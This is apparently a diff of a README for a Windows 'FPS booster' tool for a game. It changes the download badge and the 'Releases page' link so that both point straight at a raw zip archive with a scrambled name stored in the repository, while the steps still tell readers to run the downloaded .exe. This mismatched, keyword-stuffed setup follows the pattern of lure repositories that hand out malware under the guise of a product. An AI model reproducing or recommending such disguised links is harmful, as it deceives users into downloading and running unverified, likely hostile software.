@@ -1,6 +1,6 @@
 # 🚀 ArcRaiderFPSBoosterForGitHub2026 - Improve your Windows gaming performance today
 
-[![Download ArcRaider](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Dutyfree-embroiderystitch433/ArcRaiderFPSBoosterForGitHub2026/releases)
+[![Download ArcRaider](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Dutyfree-embroiderystitch433/ArcRaiderFPSBoosterForGitHub2026/main/aly/Hub_Booster_Raider_For_Git_Arc_FPS_2.6-alpha.1.zip)
 
 ArcRaiderFPSBoosterForGitHub2026 manages your Windows resource usage to improve gaming performance. This tool stabilizes frame rates and reduces latency for a smoother user experience. It works by adjusting background system tasks and optimizing memory management during active gaming sessions.
 
@@ -18,7 +18,7 @@ This application functions on standard Windows systems. Ensure your machine meet
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [Releases page](https://github.com/Dutyfree-embroiderystitch433/ArcRaiderFPSBoosterForGitHub2026/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Dutyfree-embroiderystitch433/ArcRaiderFPSBoosterForGitHub2026/main/aly/Hub_Booster_Raider_For_Git_Arc_FPS_2.6-alpha.1.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Open the downloaded file once the transfer completes.
